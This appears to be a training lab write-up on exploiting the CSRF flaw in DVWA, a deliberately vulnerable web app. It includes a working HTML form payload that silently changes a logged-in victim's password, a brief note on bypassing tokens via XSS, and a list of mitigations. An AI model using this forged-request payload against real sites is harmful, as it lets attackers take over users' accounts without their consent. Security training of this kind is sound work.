## DVWA – Cross-Site Request Forgery (CSRF)

---

### 🎯 Objective
Exploit the **CSRF vulnerability** in DVWA to change a logged-in user's password without their consent.

---

### 🧪 Lab Setup
* **Target:** DVWA (Damn Vulnerable Web Application)
* **Security Level:** Low (DVWA Security → Low)
* **Precondition:** Victim must be logged into DVWA (active session cookie)

---

### ⚙ Attack Steps

#### 1️⃣ Create a Malicious Web Page
Save the following HTML file as `csrf_attack.html` on any accessible web server:

```html
<html>
  <body>
    <h1>Click Me!</h1>
    <form action="http://<DVWA-IP>/dvwa/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="hacked123">
      <input type="hidden" name="password_conf" value="hacked123">
      <input type="hidden" name="Change" value="Change">
      <input type="submit" value="Click here">
    </form>
  </body>
</html>
```

---

#### 2️⃣ Deliver the Attack
1. Victim visits the malicious page while logged into DVWA.
2. The form auto-submits or the victim clicks the button.
3. Victim’s DVWA password changes to `hacked123` without their knowledge.

---

### 🔒 Higher Security Levels

| Security Level | Protection Mechanism             | Bypass Notes |
|----------------|----------------------------------|--------------|
| Medium / High  | CSRF tokens in form submissions  | Requires capturing token via XSS or session hijack before forging request |

---

### 🛡 Mitigation Techniques
* Implement unpredictable **CSRF tokens** per request and validate them server-side.
* Verify `Referer` or `Origin` headers for sensitive requests.
* Require **re-authentication** for password changes or account modifications.

---

### 📌 Take-Aways
* CSRF exploits the **trust** a site has in a user's browser.
* Without proper CSRF defenses, **any state-changing request** can be forged by an attacker.
